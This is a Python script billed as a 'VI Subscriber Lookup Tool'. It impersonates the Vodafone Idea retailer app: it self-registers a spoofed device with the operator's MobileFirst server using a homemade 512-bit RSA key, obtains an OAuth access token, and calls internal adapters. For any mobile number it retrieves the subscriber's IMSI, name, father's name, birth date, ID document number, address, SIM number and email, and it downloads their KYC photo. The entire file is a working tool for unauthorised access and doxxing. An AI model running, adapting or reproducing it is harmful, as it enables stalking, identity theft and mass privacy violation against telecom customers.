#!/usr/bin/env python3
"""
VI (Vodafone Idea) Subscriber Lookup Tool v2.0
With proper MobileFirst Platform device registration flow.
Uses raw RSA implementation for 512-bit keys (app compatible).
"""

import requests
import base64
import json
import os
import time
import random
import uuid
import hashlib
import struct
from datetime import datetime
from urllib.parse import urlparse, parse_qs

# ============================================================================
# CONFIGURATION (Updated from APK v9.3.1)
# ============================================================================
BASE_URL = "https://mfp.vodafoneidea.com:8103"
SERVER_CONTEXT = "/RetailerApp/"
ADAPTERS_URL = f"{BASE_URL}{SERVER_CONTEXT}api/adapters"

# App metadata from latest APK
APP_VERSION = "9.3.1"
PLATFORM_VERSION = "8.0.0.00.2015-12-11T23:31:24Z"
PACKAGE_NAME = "com.ideacellular.smartret"

# Token/credentials storage
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOKEN_FILE = os.path.join(SCRIPT_DIR, ".vi_token_v2")
KEYS_FILE = os.path.join(SCRIPT_DIR, ".vi_keys_v2.json")
DEVICE_FILE = os.path.join(SCRIPT_DIR, ".vi_device")
CLIENT_FILE = os.path.join(SCRIPT_DIR, ".vi_client_id")


# ============================================================================
# RAW RSA IMPLEMENTATION (512-bit compatible)
# ============================================================================
def miller_rabin(n, k=10):
    """Miller-Rabin primality test"""
    if n < 2:
        return False
    if n == 2 or n == 3:
        return True
    if n % 2 == 0:
        return False
    
    r, d = 0, n - 1
    while d % 2 == 0:
        r += 1
        d //= 2
    
    for _ in range(k):
        a = random.randrange(2, n - 1)
        x = pow(a, d, n)
        if x == 1 or x == n - 1:
            continue
        for _ in range(r - 1):
            x = pow(x, 2, n)
            if x == n - 1:
                break
        else:
            return False
    return True


def generate_prime(bits):
    """Generate a prime number of specified bits"""
    while True:
        n = random.getrandbits(bits)
        n |= (1 << bits - 1) | 1
        if miller_rabin(n, 20):
            return n


def extended_gcd(a, b):
    """Extended Euclidean algorithm"""
    if a == 0:
        return b, 0, 1
    gcd, x1, y1 = extended_gcd(b % a, a)
    x = y1 - (b // a) * x1
    y = x1
    return gcd, x, y


def mod_inverse(e, phi):
    """Modular multiplicative inverse"""
    gcd, x, _ = extended_gcd(e % phi, phi)
    if gcd != 1:
        raise Exception("Modular inverse does not exist")
    return (x % phi + phi) % phi


def generate_rsa_512():
    """Generate 512-bit RSA keypair"""
    print("\033[1;33m[*] Generating fresh 512-bit RSA keypair...\033[0m")
    
    # Generate two 256-bit primes
    p = generate_prime(256)
    q = generate_prime(256)
    
    n = p * q
    phi = (p - 1) * (q - 1)
    e = 65537
    d = mod_inverse(e, phi)
    
    return {"n": n, "e": e, "d": d, "p": p, "q": q}


def rsa_sign(message, key):
    """Sign message with RSA private key (PKCS#1 v1.5 SHA256)"""
    # SHA256 hash
    import hashlib
    hash_bytes = hashlib.sha256(message.encode() if isinstance(message, str) else message).digest()
    
    # PKCS#1 v1.5 padding with SHA256 DigestInfo
    # DigestInfo for SHA256: 0x30 0x31 0x30 0x0d 0x06 0x09 0x60 0x86 0x48 0x01 0x65 0x03 0x04 0x02 0x01 0x05 0x00 0x04 0x20
    digest_info = bytes([
        0x30, 0x31, 0x30, 0x0d, 0x06, 0x09, 0x60, 0x86, 0x48, 0x01, 
        0x65, 0x03, 0x04, 0x02, 0x01, 0x05, 0x00, 0x04, 0x20
    ]) + hash_bytes
    
    # Key size in bytes (512 bits = 64 bytes)
    k = (key["n"].bit_length() + 7) // 8
    
    # Padding: 0x00 0x01 [0xff padding] 0x00 [digest_info]
    ps_len = k - len(digest_info) - 3
    if ps_len < 8:
        raise ValueError("Message too long for key size")
    
    em = b'\x00\x01' + (b'\xff' * ps_len) + b'\x00' + digest_info
    
    # Convert to integer and sign
    m = int.from_bytes(em, 'big')
    s = pow(m, key["d"], key["n"])
    
    # Convert back to bytes
    sig_bytes = s.to_bytes(k, 'big')
    return sig_bytes


# ============================================================================
# KEY MANAGEMENT
# ============================================================================
def save_keypair(key):
    """Save keypair to file"""
    key_data = {k: str(v) for k, v in key.items()}
    with open(KEYS_FILE, 'w') as f:
        json.dump(key_data, f)
    print(f"\033[1;32m[+] Keypair saved\033[0m")


def load_keypair():
    """Load keypair from file"""
    if not os.path.exists(KEYS_FILE):
        return None
    try:
        with open(KEYS_FILE, 'r') as f:
            key_data = json.load(f)
        return {k: int(v) for k, v in key_data.items()}
    except:
        return None


def get_or_create_keypair():
    """Get existing keypair or create new one"""
    key = load_keypair()
    if key:
        print("\033[1;32m[+] Loaded existing RSA keypair\033[0m")
        return key
    key = generate_rsa_512()
    save_keypair(key)
    return key


# ============================================================================
# DEVICE ID MANAGEMENT
# ============================================================================
def get_device_id():
    """Get or generate persistent device ID"""
    if os.path.exists(DEVICE_FILE):
        with open(DEVICE_FILE, 'r') as f:
            return f.read().strip()
    device_id = str(uuid.uuid4())
    with open(DEVICE_FILE, 'w') as f:
        f.write(device_id)
    print(f"\033[1;32m[+] Generated new Device ID: {device_id[:20]}...\033[0m")
    return device_id


DEVICE_ID = get_device_id()


# ============================================================================
# CLIENT ID MANAGEMENT
# ============================================================================
def save_client_id(client_id):
    """Save client ID to file"""
    with open(CLIENT_FILE, 'w') as f:
        f.write(client_id)


def load_client_id():
    """Load client ID from file"""
    if os.path.exists(CLIENT_FILE):
        with open(CLIENT_FILE, 'r') as f:
            return f.read().strip()
    return None


# ============================================================================
# JWT GENERATION
# ============================================================================
def b64url_encode(data):
    """Base64 URL encode without padding"""
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()


def int_to_b64url(n):
    """Convert integer to Base64 URL encoded string (like WLBase64.encodeUrlSafe)"""
    byte_length = (n.bit_length() + 7) // 8
    num_bytes = n.to_bytes(byte_length, 'big')
    # Add leading zero if high bit is set (to match Java BigInteger.toByteArray)
    if num_bytes[0] & 0x80:
        num_bytes = b'\x00' + num_bytes
    return b64url_encode(num_bytes)


def create_jwt(payload, rsa_key, kid=None):
    """Create signed JWT with embedded JWK (like WLCertManager.signJWS)"""
    # Build JWK
    jwk = {
        "kty": "RSA",
        "n": int_to_b64url(rsa_key["n"]),
        "e": int_to_b64url(rsa_key["e"])
    }
    if kid:
        jwk["kid"] = kid
    
    # Build header
    header = {
        "alg": "RS256",
        "jwk": jwk
    }
    
    # Encode header and payload
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(',', ':')))
    
    # Sign
    signing_input = f"{header_b64}.{payload_b64}"
    signature = rsa_sign(signing_input, rsa_key)
    signature_b64 = b64url_encode(signature)
    
    return f"{signing_input}.{signature_b64}"


# ============================================================================
# HTTP HELPERS
# ============================================================================
def get_device_meta():
    """Generate device metadata"""
    return {
        "deviceID": DEVICE_ID,
        "os": "android",
        "osVersion": "15",
        "brand": "google",
        "model": "Pixel 4a",
        "mfpAppName": PACKAGE_NAME,
        "mfpAppVersion": APP_VERSION,
        "appVersionDisplay": APP_VERSION,
        "appVersionCode": "2011145360",
        "appStoreId": PACKAGE_NAME,
        "appStoreLabel": "Smart-Connect"
    }


def common_headers(content_type=None, client_id=None):
    """Generate common request headers"""
    headers = {
        'Host': 'mfp.vodafoneidea.com:8103',
        'User-Agent': f'WLNativeAPI(sunfish; BP1A.250505.005; Pixel 4a; SDK 35; Android 15)',
        'Connection': 'Keep-Alive',
        'Accept-Encoding': 'gzip',
        'X-Requested-With': 'XMLHttpRequest',
        'x-wl-app-version': APP_VERSION,
        'Accept-Language': 'en-US',
        'x-wl-platform-version': PLATFORM_VERSION,
        'x-wl-analytics-tracking-id': str(uuid.uuid4()),
        'x-mfp-analytics-metadata': json.dumps(get_device_meta())
    }
    if content_type:
        headers['Content-Type'] = content_type
    if client_id:
        headers['clientID'] = client_id
    return headers


# ============================================================================
# MOBILEFIRST REGISTRATION FLOW
# ============================================================================
def get_server_time():
    """Get server timestamp via preauth"""
    headers = common_headers('application/json; charset=UTF-8')
    data = {"scope": "", "client_id": DEVICE_ID}
    
    try:
        resp = requests.post(
            f'{BASE_URL}{SERVER_CONTEXT}api/preauth/v1/preauthorize',
            headers=headers,
            json=data,
            timeout=30
        )
        if resp.status_code == 200:
            result = resp.json()
            ts = result.get('successes', {}).get('clockSynchronization', {}).get('serverTimeStamp')
            if not ts:
                ts = result.get('serverTimeStamp')
            if ts and isinstance(ts, int):
                return ts
    except Exception as e:
        print(f"\033[1;31m[-] Preauth error: {e}\033[0m")
    
    return int(time.time() * 1000)


def register_client(rsa_key):
    """Register new client with MobileFirst server using JSON-serialized JWS"""
    print("\033[1;33m[*] Registering new client with server...\033[0m")
    
    # Build registration data (from WLConfig decompile)
    reg_data = {
        "device": {
            "id": DEVICE_ID,
            "os": "android",
            "osVersion": "15",
            "model": "Pixel 4a",
            "brand": "google",
            "environment": "android"
        },
        "application": {
            "id": PACKAGE_NAME,
            "clientPlatform": "android",
            "version": APP_VERSION
        },
        "attributes": {
            "sdk_protocol_version": 1
        }
    }
    
    # Sign as JWS (no kid for registration)
    jwk = {"kty": "RSA", "n": int_to_b64url(rsa_key["n"]), "e": int_to_b64url(rsa_key["e"])}
    header = {"alg": "RS256", "jwk": jwk}
    header_b64 = b64url_encode(json.dumps(header, separators=(',', ':')))
    payload_b64 = b64url_encode(json.dumps(reg_data, separators=(',', ':')))
    signing_input = f"{header_b64}.{payload_b64}"
    signature = rsa_sign(signing_input, rsa_key)
    signature_b64 = b64url_encode(signature)
    
    # Body: JSON-serialized JWS (NOT compact JWT)
    body = {
        "signedRegistrationData": {
            "header": header_b64,
            "payload": payload_b64,
            "signature": signature_b64
        }
    }
    
    headers = common_headers('application/json')
    
    try:
        resp = requests.post(
            f'{BASE_URL}{SERVER_CONTEXT}api/registration/v1/self',
            headers=headers,
            json=body,
            timeout=30
        )
        print(f"    Registration Status: {resp.status_code}")
        
        if resp.status_code in [200, 201]:
            # Client ID comes from Location header
            location = resp.headers.get('Location', '')
            if location:
                client_id = location.rstrip('/').split('/')[-1]
                print(f"\033[1;32m[+] Got Client ID: {client_id[:40]}...\033[0m")
                save_client_id(client_id)
                return client_id
            print(f"    Response: {resp.text[:200]}")
        else:
            print(f"    Response: {resp.text[:300]}")
            
    except Exception as e:
        print(f"\033[1;31m[-] Registration error: {e}\033[0m")
    
    return None


def get_authorization_code(client_id):
    """Get authorization code"""
    print("\033[1;33m[*] Getting authorization code...\033[0m")
    
    headers = common_headers()
    params = {
        'scope': '',
        'response_type': 'code',
        'redirect_uri': 'https://mfpredirecturi',
        'client_id': client_id,
        'isAjaxRequest': 'true',
        'x': str(random.random())
    }
    
    resp = requests.get(
        f'{BASE_URL}{SERVER_CONTEXT}api/az/v1/authorization',
        headers=headers,
        params=params,
        allow_redirects=False,
        timeout=30
    )
    
    print(f"    Auth Status: {resp.status_code}")
    
    location = resp.headers.get('Location', '')
    if location:
        print(f"    Location: {location[:60]}...")
        parsed = urlparse(location)
        qs = parse_qs(parsed.query)
        code = qs.get('code', [None])[0]
        if not code and parsed.path:
            code = parsed.path.rstrip('/').split('/')[-1]
        if code:
            print(f"\033[1;32m[+] Got Auth Code: {code[:30]}...\033[0m")
            return code
    
    if resp.status_code == 401:
        print(f"    Error: {resp.text[:200]}")
    
    return None


def exchange_token(code, client_id, rsa_key):
    """Exchange authorization code for access token"""
    print("\033[1;33m[*] Exchanging for access token...\033[0m")
    
    server_time = get_server_time()
    
    payload = {
        "iss": f"{PACKAGE_NAME}$android${APP_VERSION}",
        "sub": client_id,
        "aud": f"{BASE_URL}{SERVER_CONTEXT}api/az/v1/token",
        "exp": server_time + 60000,
        "iat": server_time,
        "jti": code
    }
    
    jwt_token = create_jwt(payload, rsa_key, client_id)
    
    headers = common_headers('application/x-www-form-urlencoded')
    data = {
        'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
        'code': str(code),
        'grant_type': 'authorization_code',
        'redirect_uri': 'https://mfpredirecturi',
        'client_assertion': jwt_token,
        'client_id': client_id,
        'isAjaxRequest': 'true',
        'x': str(random.random())
    }
    
    resp = requests.post(
        f'{BASE_URL}{SERVER_CONTEXT}api/az/v1/token',
        headers=headers,
        data=data,
        timeout=30
    )
    
    print(f"    Token Exchange Status: {resp.status_code}")
    
    if resp.status_code == 200:
        result = resp.json()
        if result.get('access_token'):
            print(f"\033[1;32m[+] Got Access Token!\033[0m")
            return result
        print(f"    Response: {resp.text[:200]}")
    else:
        print(f"    Error: {resp.text[:300]}")
    
    return None


# ============================================================================
# TOKEN MANAGEMENT
# ============================================================================
def load_token_data():
    """Load saved token and client_id"""
    if not os.path.exists(TOKEN_FILE):
        return None
    try:
        with open(TOKEN_FILE, 'r') as f:
            data = json.load(f)
        if data.get('expires_at', 0) > time.time() + 60:
            return data
    except:
        pass
    return None


def save_token_data(access_token, client_id, expires_in=3600):
    """Save token data"""
    data = {
        'access_token': access_token,
        'client_id': client_id,
        'expires_at': time.time() + expires_in,
        'saved_at': datetime.now().isoformat()
    }
    with open(TOKEN_FILE, 'w') as f:
        json.dump(data, f, indent=2)


def clear_credentials():
    """Clear all saved credentials"""
    for f in [TOKEN_FILE, KEYS_FILE, CLIENT_FILE]:
        if os.path.exists(f):
            os.remove(f)
    print("\033[1;33m[*] Cleared all saved credentials\033[0m")


def get_valid_token(force_refresh=False):
    """Get valid access token with full OAuth flow"""
    if not force_refresh:
        cached = load_token_data()
        if cached and cached.get('access_token'):
            print("\033[1;32m[+] Using cached token\033[0m")
            return cached['access_token'], cached['client_id']
    
    print("\033[1;33m[*] Starting fresh authentication...\033[0m")
    
    rsa_key = get_or_create_keypair()
    client_id = load_client_id()
    
    if not client_id:
        client_id = register_client(rsa_key)
    else:
        print(f"\033[1;32m[+] Using existing client ID: {client_id[:30]}...\033[0m")
    
    if not client_id:
        print("\033[1;31m[-] Failed to get client ID\033[0m")
        return None, None
    
    code = get_authorization_code(client_id)
    
    if not code:
        print("\033[1;31m[-] Auth failed. Trying fresh registration...\033[0m")
        clear_credentials()
        rsa_key = generate_rsa_512()
        save_keypair(rsa_key)
        client_id = register_client(rsa_key)
        if client_id:
            code = get_authorization_code(client_id)
    
    if not code:
        print("\033[1;31m[-] Failed to get authorization code\033[0m")
        return None, None
    
    token_data = exchange_token(code, client_id, rsa_key)
    
    if token_data and token_data.get('access_token'):
        access_token = token_data['access_token']
        expires_in = token_data.get('expires_in', 3600)
        save_token_data(access_token, client_id, expires_in)
        return access_token, client_id
    
    print("\033[1;31m[-] Token exchange failed\033[0m")
    return None, None


# ============================================================================
# API FUNCTIONS
# ============================================================================
BEARER_TOKEN = None
CURRENT_CLIENT_ID = None


def get_headers():
    """Get API headers with valid token"""
    global BEARER_TOKEN, CURRENT_CLIENT_ID
    
    if not BEARER_TOKEN:
        BEARER_TOKEN, CURRENT_CLIENT_ID = get_valid_token()
    
    if not BEARER_TOKEN:
        raise Exception("Failed to obtain valid token")
    
    return {
        "Host": "mfp.vodafoneidea.com:8103",
        "User-Agent": f"WLNativeAPI(Pixel 4a; SDK 35; Android 15)",
        "Content-Type": "application/x-www-form-urlencoded",
        "API_VERSION": "1.0",
        "Authorization": f"Bearer {BEARER_TOKEN}"
    }


def make_api_request(url, headers, data, retry=True):
    """Make API request with auto-retry on auth failure"""
    global BEARER_TOKEN, CURRENT_CLIENT_ID
    
    try:
        response = requests.post(url, headers=headers, data=data, timeout=30)
        
        if response.status_code in [401, 403] and retry:
            print("\033[1;33m[*] Token expired, refreshing...\033[0m")
            BEARER_TOKEN = None
            CURRENT_CLIENT_ID = None
            
            new_token, new_client = get_valid_token(force_refresh=True)
            if new_token:
                BEARER_TOKEN = new_token
                CURRENT_CLIENT_ID = new_client
                headers["Authorization"] = f"Bearer {BEARER_TOKEN}"
                return make_api_request(url, headers, data, retry=False)
        
        return response.json()
    except Exception as e:
        print(f"\033[1;31m[-] Request error: {e}\033[0m")
        return None


def get_subscriber_lookup(mobile_number):
    """Get subscriber basic info"""
    url = f"{ADAPTERS_URL}/SimexServiceVILAdapterNDC/KeySusbcriberLookup"
    headers = get_headers()
    headers["API_NAME"] = "KeySusbcriberLookup"
    
    data = {"params": f'["{mobile_number}"]'}
    
    print(f"\n\033[1;33m[*] Fetching Subscriber Lookup for: {mobile_number}\033[0m")
    
    result = make_api_request(url, headers, data)
    
    if result and result.get("isSuccessful"):
        print("\033[1;32m[+] Subscriber Lookup: SUCCESS\033[0m")
        return result
    
    reason = result.get('statusReason', 'Unknown') if result else 'No response'
    print(f"\033[1;31m[-] Subscriber Lookup Failed: {reason}\033[0m")
    return None


def get_customer_profile(circle_id, mobile_number, customer_type="Prepaid"):
    """Get customer profile details"""
    url = f"{ADAPTERS_URL}/SimexAdapterVILNew/getCustomerProfile"
    headers = get_headers()
    headers["API_NAME"] = "getCustomerProfile"
    
    data = {"params": f'["{circle_id}","{customer_type}","{mobile_number}"]'}
    
    print(f"\n\033[1;33m[*] Fetching Customer Profile...\033[0m")
    
    result = make_api_request(url, headers, data)
    
    if result and result.get("isSuccessful"):
        print("\033[1;32m[+] Customer Profile: SUCCESS\033[0m")
        return result
    
    return None


def get_customer_photo(circle_id, mobile_number, customer_type="Prepaid"):
    """Get customer photo"""
    url = f"{ADAPTERS_URL}/SimexAdapterVILNew/getCustomerPhoto"
    headers = get_headers()
    headers["API_NAME"] = "FetchCustomerPhoto"
    
    photo_params = {
        "entOrgId": "1",
        "circleId": circle_id,
        "eTopUpNumber": "1234567890",
        "agentMobileNumber": "",
        "agentId": "",
        "customer_number": mobile_number,
        "subscribertype": customer_type
    }
    
    data = {"params": f'[{json.dumps(photo_params)}]'}
    
    print(f"\n\033[1;33m[*] Fetching Customer Photo...\033[0m")
    
    result = make_api_request(url, headers, data)
    
    if result and result.get("isSuccessful"):
        print("\033[1;32m[+] Customer Photo: SUCCESS\033[0m")
        return result
    
    return None


def save_photo(base64_data, mobile_number):
    """Save photo to file"""
    try:
        output_dir = os.path.join(SCRIPT_DIR, "vi_output")
        os.makedirs(output_dir, exist_ok=True)
        
        image_data = base64.b64decode(base64_data)
        filename = f"{output_dir}/{mobile_number}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        
        with open(filename, "wb") as f:
            f.write(image_data)
        
        print(f"\033[1;32m[+] Photo saved: {filename}\033[0m")
        return filename
    except Exception as e:
        print(f"\033[1;31m[-] Error saving photo: {e}\033[0m")
        return None


def display_results(subscriber_data, profile_data, photo_data, photo_path, mobile_number):
    """Display results"""
    print("\n" + "="*65)
    print("\033[1;36m" + " "*20 + "📋 SUBSCRIBER DETAILS" + " "*20 + "\033[0m")
    print("="*65)
    
    print("\n\033[1;35m┌─── BASIC INFO ───────────────────────────────────────────────┐\033[0m")
    print(f"\033[1;37m│ Mobile Number    : \033[1;33m{mobile_number}\033[0m")
    print(f"\033[1;37m│ Subscriber ID    : \033[1;33m{subscriber_data.get('subscriberId', 'N/A')}\033[0m")
    print(f"\033[1;37m│ IMSI             : \033[1;33m{subscriber_data.get('imsi', 'N/A')}\033[0m")
    print(f"\033[1;37m│ Port Status      : \033[1;33m{subscriber_data.get('mnp', 'N/A')}\033[0m")    
    print(f"\033[1;37m│ Circle ID        : \033[1;33m{subscriber_data.get('circleId', 'N/A')}\033[0m")
    print(f"\033[1;37m│ Customer Type    : \033[1;33m{subscriber_data.get('customerType', 'N/A')}\033[0m")
    print(f"\033[1;37m│ Brand            : \033[1;33m{subscriber_data.get('brand', 'N/A')}\033[0m")
    print(f"\033[1;37m│ Status           : \033[1;32m{subscriber_data.get('status', 'N/A')}\033[0m")
    print(f"\033[1;37m│ Activation Date  : \033[1;33m{subscriber_data.get('activationDate', 'N/A')}\033[0m")
    print("\033[1;35m└──────────────────────────────────────────────────────────────┘\033[0m")
    
    if profile_data:
        print("\n\033[1;35m┌─── PERSONAL INFO ────────────────────────────────────────────┐\033[0m")

        full_name = f"{profile_data.get('title', '')} {profile_data.get('firstName', '')} {profile_data.get('middleName', '')} {profile_data.get('lastName', '')}".strip()

        print(f"\033[1;37m│ Full Name        : \033[1;33m{full_name if full_name else 'N/A'}\033[0m")
        print(f"\033[1;37m│ Father's Name    : \033[1;33m{profile_data.get('FatherOrSpouceName', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Date of Birth    : \033[1;33m{profile_data.get('dob', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Customer ID      : \033[1;33m{profile_data.get('customerId', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Status           : \033[1;33m{profile_data.get('statusReason', 'N/A')}\033[0m")
        print(f"\033[1;37m│ POI Type         : \033[1;33m{profile_data.get('POIType', 'N/A')}\033[0m")
        print(f"\033[1;37m│ POI Number       : \033[1;33m{profile_data.get('POITypeID', 'N/A')}\033[0m")

        print("\033[1;35m└──────────────────────────────────────────────────────────────┘\033[0m")

        print("\n\033[1;36m┌─── ADDRESS INFO ─────────────────────────────────────────────┐\033[0m")

        address_parts = [
            profile_data.get('houseNo', ''),
            profile_data.get('street', ''),
            profile_data.get('locality', ''),
            profile_data.get('landmark', '')
        ]
        address = ", ".join([x for x in address_parts if x and x != "."])

        print(f"\033[1;37m│ Address          : \033[1;33m{address if address else 'N/A'}\033[0m")
        print(f"\033[1;37m│ City (VTC)       : \033[1;33m{profile_data.get('vtc', 'N/A')}\033[0m")
        print(f"\033[1;37m│ State            : \033[1;33m{profile_data.get('state', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Country          : \033[1;33m{profile_data.get('country', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Pincode          : \033[1;33m{profile_data.get('pincode', 'N/A')}\033[0m")

        print("\033[1;36m└──────────────────────────────────────────────────────────────┘\033[0m")

        print("\n\033[1;34m┌─── CONNECTION INFO ──────────────────────────────────────────┐\033[0m")

        print(f"\033[1;37m│ SIM Number       : \033[1;33m{profile_data.get('SIMNumber', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Alternate No     : \033[1;33m{profile_data.get('custAltNo', 'N/A')}\033[0m")
        print(f"\033[1;37m│ Email ID         : \033[1;33m{profile_data.get('emailID', 'N/A')}\033[0m")

        print("\033[1;34m└──────────────────────────────────────────────────────────────┘\033[0m")
    
    if photo_path:
        print(f"\n\033[1;32m[+] Photo saved at: {photo_path}\033[0m")
    
    print("\n" + "="*65)


def print_banner():
    """Print banner"""
    banner = """
╔══════════════════════════════════════════════════════════════╗
║     ██╗   ██╗██╗    ██╗      ██████╗  ██████╗ ██╗  ██╗       ║
║     ██║   ██║██║    ██║     ██╔═══██╗██╔═══██╗██║ ██╔╝       ║
║     ██║   ██║██║    ██║     ██║   ██║██║   ██║█████╔╝        ║
║     ╚██╗ ██╔╝██║    ██║     ██║   ██║██║   ██║██╔═██╗        ║
║      ╚████╔╝ ██║    ███████╗╚██████╔╝╚██████╔╝██║  ██╗       ║
║       ╚═══╝  ╚═╝    ╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝       ║
║              VI Subscriber Lookup v2.0 (MFP Auth)            ║
╚══════════════════════════════════════════════════════════════╝
    """
    print("\033[1;36m" + banner + "\033[0m")


def test_auth_only():
    """Test just the authentication flow"""
    print("\n\033[1;33m=== TESTING AUTHENTICATION FLOW ===\033[0m\n")
    token, client_id = get_valid_token(force_refresh=True)
    if token:
        print(f"\n\033[1;32m✓ Authentication successful!\033[0m")
        print(f"  Token: {token[:50]}...")
        print(f"  Client: {client_id[:40]}...")
    else:
        print(f"\n\033[1;31m✗ Authentication failed!\033[0m")


def main():
    """Main function"""
    print_banner()
    
    print("\n\033[1;37m[1] Subscriber Lookup")
    print("[2] Test Auth Only")
    print("[3] Clear Credentials & Auth Fresh")
    print("[0] Exit\033[0m")
    
    choice = input("\n\033[1;37m[?] Enter choice: \033[0m").strip()
    
    if choice == "0":
        return
    
    if choice == "2":
        test_auth_only()
        return
    
    if choice == "3":
        clear_credentials()
        test_auth_only()
        return
    
    if choice != "1":
        print("\033[1;31m[-] Invalid choice\033[0m")
        return
    
    mobile_number = input("\033[1;37m[?] Enter Mobile Number (10 digits): \033[0m").strip()
    
    if not mobile_number.isdigit() or len(mobile_number) != 10:
        print("\033[1;31m[-] Invalid mobile number! Must be 10 digits.\033[0m")
        return
    
    subscriber_data = get_subscriber_lookup(mobile_number)
    if not subscriber_data:
        print("\033[1;31m[-] Subscriber lookup failed.\033[0m")
        return
    
    circle_id = subscriber_data.get("circleId")
    customer_type = subscriber_data.get("customerType", "Prepaid")
    
    if not circle_id:
        print("\033[1;31m[-] Could not extract circleId.\033[0m")
        return
    
    profile_data = get_customer_profile(circle_id, mobile_number, customer_type)
    photo_data = get_customer_photo(circle_id, mobile_number, customer_type)
    
    photo_path = None
    if photo_data and photo_data.get("custImage"):
        photo_path = save_photo(photo_data["custImage"], mobile_number)
    
    display_results(subscriber_data, profile_data, photo_data, photo_path, mobile_number)


if __name__ == "__main__":
    main()
